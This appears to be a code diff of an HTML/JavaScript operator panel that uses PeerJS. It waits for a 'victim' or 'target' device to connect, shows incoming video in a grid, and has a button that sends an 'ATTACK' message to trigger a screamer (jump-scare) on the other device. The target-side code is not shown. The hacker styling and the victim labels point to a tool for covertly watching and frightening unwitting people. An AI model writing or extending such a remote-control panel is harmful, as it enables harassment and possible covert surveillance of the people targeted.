@@ -1,46 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Панель Управления (Ваниш)</title>
+    <title>Система Ваниш</title>
     <meta charset="utf-8">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #0b0b0b; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        #sidebar { width: 280px; border-right: 1px solid #333; padding: 20px; background: #111; }
-        #display { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
-        video { width: 100%; border: 2px solid #ff0050; border-radius: 10px; background: #000; }
-        .btn-attack { background: #ff0000; color: #fff; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 10px; margin-top: 20px; }
-        .user-card { background: #222; padding: 10px; border-radius: 5px; margin-top: 10px; border-left: 3px solid #0f0; }
+        body { background: #0b0b0b; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
+        #sidebar { width: 300px; border-right: 1px solid #333; padding: 20px; background: #111; display: flex; flex-direction: column; }
+        #display { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 15px; }
+        video { width: 100%; border: 2px solid #ff0050; border-radius: 10px; background: #000; box-shadow: 0 0 15px rgba(255,0,80,0.2); }
+        .btn-attack { background: #ff0000; color: #fff; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 10px; margin-top: auto; }
+        .user-card { background: #1a1a1a; padding: 10px; border-radius: 5px; border: 1px solid #0f0; margin-top: 15px; animation: blink 1s infinite; }
+        @keyframes blink { 50% { border-color: transparent; } }
     </style>
 </head>
 <body>
-    <audio id="notif-sound" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>
+    <audio id="login-sound" src="https://www.myinstants.com/media/sounds/hacking-sound-effect.mp3"></audio>
 
     <div id="sidebar">
-        <h2>SYSTEM CONTROL</h2>
-        <div id="status">ОЖИДАНИЕ...</div>
+        <h2>CORE_MONITOR v2</h2>
+        <div id="status">SCANNING...</div>
         <div id="user-info"></div>
-        <hr color="#333">
         <button id="attackBtn" class="btn-attack" onclick="attack()" disabled>⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
     </div>
-    <div id="display"></div>
+    
+    <div id="display">
+        </div>
 
     <script>
         const MY_ID = '09062012';
         const peer = new Peer(MY_ID);
         let activeConn = null;
 
-        // Функция звука
-        function playNotif() {
-            const audio = document.getElementById('notif-sound');
-            audio.play().catch(() => console.log("Кликни по странице для активации звука"));
+        function playLogin() {
+            document.getElementById('login-sound').play().catch(() => {});
         }
 
         peer.on('connection', conn => {
             activeConn = conn;
-            playNotif(); // Звук при подключении данных
-            document.getElementById('status').innerText = "ЖЕРТВА В СЕТИ";
-            document.getElementById('user-info').innerHTML = `<div class="user-card">NEW DEVICE CONNECTED</div>`;
+            playLogin(); // Звук взлома
+            document.getElementById('status').innerText = "CONNECTION ESTABLISHED";
+            document.getElementById('user-info').innerHTML = `<div class="user-card">> TARGET_CONNECTED</div>`;
             document.getElementById('attackBtn').disabled = false;
         });
 
@@ -57,6 +57,9 @@
         function attack() {
             if(activeConn) activeConn.send('ATTACK');
         }
+
+        // Чтобы звук работал, нужно кликнуть по странице админа один раз после открытия
+        window.onclick = () => { console.log("Звуковая система готова"); };
     </script>
 </body>
 </html>
